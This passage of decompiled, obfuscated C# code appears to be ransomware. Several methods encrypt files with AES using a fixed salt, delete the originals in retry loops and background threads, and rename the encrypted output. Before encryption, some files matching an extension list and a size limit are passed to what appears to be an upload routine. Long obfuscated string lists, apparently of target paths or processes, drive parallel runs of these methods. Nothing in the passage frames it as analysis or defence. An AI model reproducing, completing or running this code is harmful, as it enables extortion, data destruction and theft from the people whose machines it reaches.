										CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (SsCiUkhFaPaV)
									{
										try
										{
											File.AppendAllText(eBcYzZJOdxm, onnLxZACFDoQRfFR.getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + onnLxZACFDoQRfFR.getString_0(107389390) + ex8.Message + onnLxZACFDoQRfFR.getString_0(107396695));
										}
										catch (Exception)
										{
										}
									}
									BFoWsrHVmkbzUDmB++;
									return;
								}
							}
							if (dHWQzBpmcn)
							{
								if (CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ != onnLxZACFDoQRfFR.getString_0(107389436))
								{
									ulbKceXLNzC(CS_0024_003C_003E8__locals0.hpBPJRIyXygh + CS_0024_003C_003E8__locals0.aBgVqDzNPCJQ, bytes2);
								}
								else
								{
									ulbKceXLNzC(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, bytes2);
								}
							}
						}
						end_IL_0656_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d56;
			IL_0d56:
			CS_0024_003C_003E8__locals0.vgijhoARFhV.Remove(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
		});
	}

	private static void PBYLSHrxDJgoZC(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (NovBIDwMVoo == getString_0(107396883))
					{
						foreach (string item in EDjNxpdqMiO)
						{
							if (string_0.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396883))
							{
								if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396888))
							{
								try
								{
									OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389412)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389412), getString_0(107393216)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void CQSgBNnEZGz(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (NovBIDwMVoo == getString_0(107396883))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in EDjNxpdqMiO)
			{
				if (string_0.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396883))
				{
					if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396888))
				{
					try
					{
						OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		RVAcslUCYF++;
	}

	private static void wjPMLlmajetI(string string_0, string string_1, byte[] byte_0)
	{
		JraJWxYgDVYNbR CS_0024_003C_003E8__locals0 = new JraJWxYgDVYNbR();
		CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX = string_0;
		CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string dmdUSqdmWxRohM = CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM;
			FileStream fileStream = new FileStream(dmdUSqdmWxRohM, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (OFRFzhlcWBOLOw == getString_0(107396883))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM.Length > 0)
				{
					if (NovBIDwMVoo == getString_0(107396883))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in EDjNxpdqMiO)
						{
							if (CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396883))
							{
								if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396888))
							{
								try
								{
									OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393265), getString_0(107393292), getString_0(107393279), CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM.EndsWith(getString_0(107389412)))
					{
						File.Move(CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM, CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM.Replace(getString_0(107389412), getString_0(107393216)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM))
							{
								File.Delete(CS_0024_003C_003E8__locals0.DmdUSqdmWxRohM);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (SsCiUkhFaPaV)
			{
				try
				{
					File.AppendAllText(eBcYzZJOdxm, getString_0(107389152) + CS_0024_003C_003E8__locals0.zhVVNYGbZQcrX + getString_0(107389371) + ex2.Message + getString_0(107396676));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__9()
	{
		List<string> uVpQTTmnwTapUSsO = UVpQTTmnwTapUSsO;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				dpCBMnJAbTYLKem(getString_0(107389350), string_0);
			};
		}
		Parallel.ForEach(uVpQTTmnwTapUSsO, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		List<string> source = adLbaicOXAzUc;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				dpCBMnJAbTYLKem(getString_0(107392209), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
		List<string> jfNhBrPHaPG = JfNhBrPHaPG;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
			{
				dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107389309)), string_0);
			};
		}
		Parallel.ForEach(jfNhBrPHaPG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
		if (edUQHPvprdg == getString_0(107396883))
		{
			string[] source2 = vhPoJYKYool;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
				{
					dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107389309)), getString_0(107389316) + string_0 + getString_0(107388763));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
		}
		if (!hpcvcOchTBoC().Contains(getString_0(107389498)))
		{
			IxgZHDLTHUruQ(BCwMNEaFehJEAEW);
		}
		else
		{
			List<string> source3 = hrvpUvZQVch;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
				{
					dpCBMnJAbTYLKem(yasjygrGJqTJ(IeLtjAHHavBrLSv(getString_0(107388758))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		}
		List<string> nQvyRawduvn = NQvyRawduvn;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b = delegate(string string_0)
			{
				dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107388733)), string_0);
			};
		}
		Parallel.ForEach(nQvyRawduvn, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b);
		List<string> dseODPGHlUJHTz = DseODPGHlUJHTz;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c = delegate(string string_0)
			{
				dpCBMnJAbTYLKem(getString_0(107388748), string_0);
			};
		}
		Parallel.ForEach(dseODPGHlUJHTz, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		dpCBMnJAbTYLKem(getString_0(107389350), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		dpCBMnJAbTYLKem(getString_0(107392209), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107389309)), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107389309)), getString_0(107389316) + string_0 + getString_0(107388763));
	}

	private static void _003CMain_003Eb__e(string string_0)
	{
		dpCBMnJAbTYLKem(yasjygrGJqTJ(IeLtjAHHavBrLSv(getString_0(107388758))), string_0);
	}

	private static void _003CMain_003Eb__f(string string_0)
	{
		dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107388733)), string_0);
	}

	private static void _003CMain_003Eb__10(string string_0)
	{
		dpCBMnJAbTYLKem(getString_0(107388748), string_0);
	}

	static NiISdmMYRfnXGiX()
	{
		Strings.CreateGetStringDelegate(typeof(NiISdmMYRfnXGiX));
		DRPtrRarqnZhQ = getString_0(107393160);
		WwvaLWuUsMuy = null;
		SqCSaFJrwXuBuO = getString_0(107396888);
		peIBzCUyrIICrp = getString_0(107388739);
		vaSLUTUbjeY = new List<string>();
		qvQITLkknYg = new List<string>();
		wnDiQIMWsMjP = getString_0(107396888);
		NRMuHnCdQTWUX = getString_0(107393216);
		hlkjzPFfXjrEc = getString_0(107393216);
		SNAuLiPuLKioXr = getString_0(107396888);
		WKCoBXAFCAZNg = 0;
		nSEgZCqbKaXqV = getString_0(107396888);
		OYBipZCrcXNH = getString_0(107396888);
		rEspfQtigPTwQN = getString_0(107396888);
		mwYFUnpJUrJi = getString_0(107388694);
		eJRGmzGrfjhI = getString_0(107396888);
		ZCLtjyZjWZrKzeXI = getString_0(107396888);
		vlKMEVvYQSGwChf = getString_0(107396888);
		XklJeizwoKyzsVC = getString_0(107396888);
		wqqBwrXAQMhONm = new List<string>
		{
			yasjygrGJqTJ(getString_0(107388689)),
			yasjygrGJqTJ(getString_0(107388704)),
			yasjygrGJqTJ(getString_0(107388679)),
			yasjygrGJqTJ(getString_0(107388630)),
			yasjygrGJqTJ(getString_0(107388605)),
			yasjygrGJqTJ(getString_0(107388612)),
			yasjygrGJqTJ(getString_0(107388563)),
			yasjygrGJqTJ(getString_0(107388538)),
			yasjygrGJqTJ(getString_0(107388545)),
			yasjygrGJqTJ(getString_0(107389032)),
			yasjygrGJqTJ(getString_0(107388983)),
			yasjygrGJqTJ(getString_0(107388958)),
			yasjygrGJqTJ(getString_0(107388965))
		};
		wGUqZKpPfawraYO = new List<string>();
		YRJBQgLVUguPTZP = getString_0(107396883);
		PYbHGaJGFJZl = getString_0(107396888);
		rcxTEKCmuvTVT = getString_0(107396888);
		LfbVDKLAiBGoZzsY = new List<string>();
		onhVybuhTZhWQWa = getString_0(107396888);
		FyXMEKRnlKoKP = getString_0(107388940);
		GLHMCZIBTJO = getString_0(107396888);
		plUEwiNwSwDP = getString_0(107396888);
		adLbaicOXAzUc = new List<string>
		{
			yasjygrGJqTJ(getString_0(107388859)),
			yasjygrGJqTJ(getString_0(107388826)),
			yasjygrGJqTJ(getString_0(107388793)),
			yasjygrGJqTJ(getString_0(107388248)),
			yasjygrGJqTJ(getString_0(107388215)),
			yasjygrGJqTJ(getString_0(107388186)),
			yasjygrGJqTJ(getString_0(107388161)),
			yasjygrGJqTJ(getString_0(107388132)),
			yasjygrGJqTJ(getString_0(107388055)),
			yasjygrGJqTJ(getString_0(107388502)),
			yasjygrGJqTJ(getString_0(107388469)),
			yasjygrGJqTJ(getString_0(107388436)),
			yasjygrGJqTJ(getString_0(107388403)),
			yasjygrGJqTJ(getString_0(107388374)),
			yasjygrGJqTJ(getString_0(107388345)),
			yasjygrGJqTJ(getString_0(107388304)),
			yasjygrGJqTJ(getString_0(107388295)),
			yasjygrGJqTJ(getString_0(107387726)),
			yasjygrGJqTJ(getString_0(107387645)),
			yasjygrGJqTJ(getString_0(107387612)),
			yasjygrGJqTJ(getString_0(107387615)),
			yasjygrGJqTJ(getString_0(107387542)),
			yasjygrGJqTJ(getString_0(107387533)),
			yasjygrGJqTJ(getString_0(107388012)),
			yasjygrGJqTJ(getString_0(107387931)),
			yasjygrGJqTJ(getString_0(107387906)),
			yasjygrGJqTJ(getString_0(107387833)),
			yasjygrGJqTJ(getString_0(107387804)),
			yasjygrGJqTJ(getString_0(107387763)),
			yasjygrGJqTJ(getString_0(107387194)),
			yasjygrGJqTJ(getString_0(107387129)),
			yasjygrGJqTJ(getString_0(107387104)),
			yasjygrGJqTJ(getString_0(107387039)),
			yasjygrGJqTJ(getString_0(107387502)),
			yasjygrGJqTJ(getString_0(107387437)),
			yasjygrGJqTJ(getString_0(107387348)),
			yasjygrGJqTJ(getString_0(107387315)),
			yasjygrGJqTJ(getString_0(107387306)),
			yasjygrGJqTJ(getString_0(107387265)),
			yasjygrGJqTJ(getString_0(107386676)),
			yasjygrGJqTJ(getString_0(107386647)),
			yasjygrGJqTJ(getString_0(107386582)),
			yasjygrGJqTJ(getString_0(107386573)),
			yasjygrGJqTJ(getString_0(107386540)),
			yasjygrGJqTJ(getString_0(107386499)),
			yasjygrGJqTJ(getString_0(107386930)),
			yasjygrGJqTJ(getString_0(107386917)),
			yasjygrGJqTJ(getString_0(107386812)),
			yasjygrGJqTJ(getString_0(107386767)),
			yasjygrGJqTJ(getString_0(107386754)),
			yasjygrGJqTJ(getString_0(107386165)),
			yasjygrGJqTJ(getString_0(107386156)),
			yasjygrGJqTJ(getString_0(107386083)),
			yasjygrGJqTJ(getString_0(107386054)),
			yasjygrGJqTJ(getString_0(107385981)),
			yasjygrGJqTJ(getString_0(107386428)),
			yasjygrGJqTJ(getString_0(107386383)),
			yasjygrGJqTJ(getString_0(107386354)),
			yasjygrGJqTJ(getString_0(107386341)),
			yasjygrGJqTJ(getString_0(107386276)),
			yasjygrGJqTJ(getString_0(107386247)),
			yasjygrGJqTJ(getString_0(107385678)),
			yasjygrGJqTJ(getString_0(107385613)),
			yasjygrGJqTJ(getString_0(107385572)),
			yasjygrGJqTJ(getString_0(107385543)),
			yasjygrGJqTJ(getString_0(107385470)),
			yasjygrGJqTJ(getString_0(107385933)),
			yasjygrGJqTJ(getString_0(107385840)),
			yasjygrGJqTJ(getString_0(107385799)),
			yasjygrGJqTJ(getString_0(107385722)),
			yasjygrGJqTJ(getString_0(107385177)),
			yasjygrGJqTJ(getString_0(107385136)),
			yasjygrGJqTJ(getString_0(107385091)),
			yasjygrGJqTJ(getString_0(107385014)),
			yasjygrGJqTJ(getString_0(107385437)),
			yasjygrGJqTJ(getString_0(107385420)),
			yasjygrGJqTJ(getString_0(107385359)),
			yasjygrGJqTJ(getString_0(107385350)),
			yasjygrGJqTJ(getString_0(107385285)),
			yasjygrGJqTJ(getString_0(107385204)),
			yasjygrGJqTJ(getString_0(107384635)),
			yasjygrGJqTJ(getString_0(107384602)),
			yasjygrGJqTJ(getString_0(107384541)),
			yasjygrGJqTJ(getString_0(107384516)),
			yasjygrGJqTJ(getString_0(107387348)),
			yasjygrGJqTJ(getString_0(107384459)),
			yasjygrGJqTJ(getString_0(107384930)),
			yasjygrGJqTJ(getString_0(107384841)),
			yasjygrGJqTJ(getString_0(107384764)),
			yasjygrGJqTJ(getString_0(107384735)),
			yasjygrGJqTJ(getString_0(107384710)),
			yasjygrGJqTJ(getString_0(107384121)),
			yasjygrGJqTJ(getString_0(107384104)),
			yasjygrGJqTJ(getString_0(107387194)),
			yasjygrGJqTJ(getString_0(107384039)),
			yasjygrGJqTJ(getString_0(107383966)),
			yasjygrGJqTJ(getString_0(107383941)),
			yasjygrGJqTJ(getString_0(107387129)),
			yasjygrGJqTJ(getString_0(107384348)),
			yasjygrGJqTJ(getString_0(107384331)),
			yasjygrGJqTJ(getString_0(107384210)),
			yasjygrGJqTJ(getString_0(107383633)),
			yasjygrGJqTJ(getString_0(107383616)),
			yasjygrGJqTJ(getString_0(107387039)),
			yasjygrGJqTJ(getString_0(107383507)),
			yasjygrGJqTJ(getString_0(107387315)),
			yasjygrGJqTJ(getString_0(107387502)),
			yasjygrGJqTJ(getString_0(107383474)),
			yasjygrGJqTJ(getString_0(107383417)),
			yasjygrGJqTJ(getString_0(107387437)),
			yasjygrGJqTJ(getString_0(107383896)),
			yasjygrGJqTJ(getString_0(107383879)),
			yasjygrGJqTJ(getString_0(107383798)),
			yasjygrGJqTJ(getString_0(107387763)),
			yasjygrGJqTJ(getString_0(107383773)),
			yasjygrGJqTJ(getString_0(107383728)),
			yasjygrGJqTJ(getString_0(107383699)),
			yasjygrGJqTJ(getString_0(107383670)),
			yasjygrGJqTJ(getString_0(107383145)),
			yasjygrGJqTJ(getString_0(107383112)),
			yasjygrGJqTJ(getString_0(107383055)),
			yasjygrGJqTJ(getString_0(107383042)),
			yasjygrGJqTJ(getString_0(107383017)),
			yasjygrGJqTJ(getString_0(107382976)),
			yasjygrGJqTJ(getString_0(107382899)),
			yasjygrGJqTJ(getString_0(107383394)),
			yasjygrGJqTJ(getString_0(107383337)),
			yasjygrGJqTJ(getString_0(107383304)),
			yasjygrGJqTJ(getString_0(107383227)),
			yasjygrGJqTJ(getString_0(107383194)),
			yasjygrGJqTJ(getString_0(107383153)),
			yasjygrGJqTJ(getString_0(107387804)),
			yasjygrGJqTJ(getString_0(107383394)),
			yasjygrGJqTJ(getString_0(107382632)),
			yasjygrGJqTJ(getString_0(107382603)),
			yasjygrGJqTJ(getString_0(107382574)),
			yasjygrGJqTJ(getString_0(107382493)),
			yasjygrGJqTJ(getString_0(107382452)),
			yasjygrGJqTJ(getString_0(107382391)),
			yasjygrGJqTJ(getString_0(107382862)),
			yasjygrGJqTJ(getString_0(107382801)),
			yasjygrGJqTJ(getString_0(107382768)),
			yasjygrGJqTJ(getString_0(107382727)),
			yasjygrGJqTJ(getString_0(107382698)),
			yasjygrGJqTJ(getString_0(107382109)),
			yasjygrGJqTJ(getString_0(107382044)),
			yasjygrGJqTJ(getString_0(107382011)),
			yasjygrGJqTJ(getString_0(107381998)),
			yasjygrGJqTJ(getString_0(107381905)),
			yasjygrGJqTJ(getString_0(107381872)),
			yasjygrGJqTJ(getString_0(107382371)),
			yasjygrGJqTJ(getString_0(107382306)),
			yasjygrGJqTJ(getString_0(107382273)),
			yasjygrGJqTJ(getString_0(107382200)),
			yasjygrGJqTJ(getString_0(107382183)),
			yasjygrGJqTJ(getString_0(107387931)),
			yasjygrGJqTJ(getString_0(107382154)),
			yasjygrGJqTJ(getString_0(107381553)),
			yasjygrGJqTJ(getString_0(107381544)),
			yasjygrGJqTJ(getString_0(107381467)),
			yasjygrGJqTJ(getString_0(107381426)),
			yasjygrGJqTJ(getString_0(107381413)),
			yasjygrGJqTJ(getString_0(107381864)),
			yasjygrGJqTJ(getString_0(107381783)),
			yasjygrGJqTJ(getString_0(107381766)),
			yasjygrGJqTJ(getString_0(107381709)),
			yasjygrGJqTJ(getString_0(107381620)),
			yasjygrGJqTJ(getString_0(107381095)),
			yasjygrGJqTJ(getString_0(107381022)),
			yasjygrGJqTJ(getString_0(107380997)),
			yasjygrGJqTJ(getString_0(107387906)),
			yasjygrGJqTJ(getString_0(107380892)),
			yasjygrGJqTJ(getString_0(107380895)),
			yasjygrGJqTJ(getString_0(107381342)),
			yasjygrGJqTJ(getString_0(107381301)),
			yasjygrGJqTJ(getString_0(107381272)),
			yasjygrGJqTJ(getString_0(107388012)),
			yasjygrGJqTJ(getString_0(107381231)),
			yasjygrGJqTJ(getString_0(107381182)),
			yasjygrGJqTJ(getString_0(107381185)),
			yasjygrGJqTJ(getString_0(107386247)),
			yasjygrGJqTJ(getString_0(107381152)),
			yasjygrGJqTJ(getString_0(107381185)),
			yasjygrGJqTJ(getString_0(107381123)),
			yasjygrGJqTJ(getString_0(107413350)),
			yasjygrGJqTJ(getString_0(107413321)),
			yasjygrGJqTJ(getString_0(107413240)),
			yasjygrGJqTJ(getString_0(107413223)),
			yasjygrGJqTJ(getString_0(107413150)),
			yasjygrGJqTJ(getString_0(107413121)),
			yasjygrGJqTJ(getString_0(107413604)),
			yasjygrGJqTJ(getString_0(107413531)),
			yasjygrGJqTJ(getString_0(107413518)),
			yasjygrGJqTJ(getString_0(107413473)),
			yasjygrGJqTJ(getString_0(107413440)),
			yasjygrGJqTJ(getString_0(107413383)),
			yasjygrGJqTJ(getString_0(107412794)),
			yasjygrGJqTJ(getString_0(107412769)),
			yasjygrGJqTJ(getString_0(107412736)),
			yasjygrGJqTJ(getString_0(107412663)),
			yasjygrGJqTJ(getString_0(107412634)),
			yasjygrGJqTJ(getString_0(107413085)),
			yasjygrGJqTJ(getString_0(107413052)),
			yasjygrGJqTJ(getString_0(107413027)),
			yasjygrGJqTJ(getString_0(107412954)),
			yasjygrGJqTJ(getString_0(107412937)),
			yasjygrGJqTJ(getString_0(107412904)),
			yasjygrGJqTJ(getString_0(107412311)),
			yasjygrGJqTJ(getString_0(107412298)),
			yasjygrGJqTJ(getString_0(107412217)),
			yasjygrGJqTJ(getString_0(107412204)),
			yasjygrGJqTJ(getString_0(107412123)),
			yasjygrGJqTJ(getString_0(107412090)),
			yasjygrGJqTJ(getString_0(107412561)),
			yasjygrGJqTJ(getString_0(107412552)),
			yasjygrGJqTJ(getString_0(107412475)),
			yasjygrGJqTJ(getString_0(107382452)),
			yasjygrGJqTJ(getString_0(107412442)),
			yasjygrGJqTJ(getString_0(107412401)),
			yasjygrGJqTJ(getString_0(107412344)),
			yasjygrGJqTJ(getString_0(107411803)),
			yasjygrGJqTJ(getString_0(107411770)),
			yasjygrGJqTJ(getString_0(107411737)),
			yasjygrGJqTJ(getString_0(107411720)),
			yasjygrGJqTJ(getString_0(107411691)),
			yasjygrGJqTJ(getString_0(107411614)),
			yasjygrGJqTJ(getString_0(107411569)),
			yasjygrGJqTJ(getString_0(107412072)),
			yasjygrGJqTJ(getString_0(107411983)),
			yasjygrGJqTJ(getString_0(107411934)),
			yasjygrGJqTJ(getString_0(107411937)),
			yasjygrGJqTJ(getString_0(107411860))
		};
		UVpQTTmnwTapUSsO = new List<string>
		{
			yasjygrGJqTJ(getString_0(107411851)),
			yasjygrGJqTJ(getString_0(107411258)),
			yasjygrGJqTJ(getString_0(107411241)),
			yasjygrGJqTJ(getString_0(107411160)),
			yasjygrGJqTJ(getString_0(107411143)),
			yasjygrGJqTJ(getString_0(107411078)),
			yasjygrGJqTJ(getString_0(107411481)),
			yasjygrGJqTJ(getString_0(107411420))
		};
		JfNhBrPHaPG = new List<string>
		{
			yasjygrGJqTJ(getString_0(107411395)),
			yasjygrGJqTJ(getString_0(107411362)),
			yasjygrGJqTJ(getString_0(107410773)),
			yasjygrGJqTJ(getString_0(107410756)),
			yasjygrGJqTJ(getString_0(107410723)),
			yasjygrGJqTJ(getString_0(107410642)),
			yasjygrGJqTJ(getString_0(107410629)),
			yasjygrGJqTJ(getString_0(107410596)),
			yasjygrGJqTJ(getString_0(107410563)),
			yasjygrGJqTJ(getString_0(107411042)),
			yasjygrGJqTJ(getString_0(107411009)),
			yasjygrGJqTJ(getString_0(107410976)),
			yasjygrGJqTJ(getString_0(107410903)),
			yasjygrGJqTJ(getString_0(107410894)),
			yasjygrGJqTJ(getString_0(107410849)),
			yasjygrGJqTJ(getString_0(107410816)),
			yasjygrGJqTJ(getString_0(107410231)),
			yasjygrGJqTJ(getString_0(107410198)),
			yasjygrGJqTJ(getString_0(107410189)),
			yasjygrGJqTJ(getString_0(107410148)),
			yasjygrGJqTJ(getString_0(107410115)),
			yasjygrGJqTJ(getString_0(107410042)),
			yasjygrGJqTJ(getString_0(107410521)),
			yasjygrGJqTJ(getString_0(107411395)),
			yasjygrGJqTJ(getString_0(107410480)),
			yasjygrGJqTJ(getString_0(107410471)),
			yasjygrGJqTJ(getString_0(107410394)),
			yasjygrGJqTJ(getString_0(107410361)),
			yasjygrGJqTJ(getString_0(107410320)),
			yasjygrGJqTJ(getString_0(107410311)),
			yasjygrGJqTJ(getString_0(107409766)),
			yasjygrGJqTJ(getString_0(107409693)),
			yasjygrGJqTJ(getString_0(107409652)),
			yasjygrGJqTJ(getString_0(107411362)),
